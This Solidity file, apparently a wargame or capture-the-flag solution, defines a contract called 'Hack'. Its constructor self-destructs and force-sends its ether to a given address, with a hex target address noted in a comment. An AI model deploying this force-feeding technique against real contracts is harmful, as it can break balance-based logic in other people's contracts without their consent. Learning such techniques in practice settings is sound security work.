// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0x15e04a4D0c0243CEC59b3830c217623e75Fdf9E4

contract Hack{
    constructor(address payable _ContractAddress) payable{
        selfdestruct(_ContractAddress);
    }
}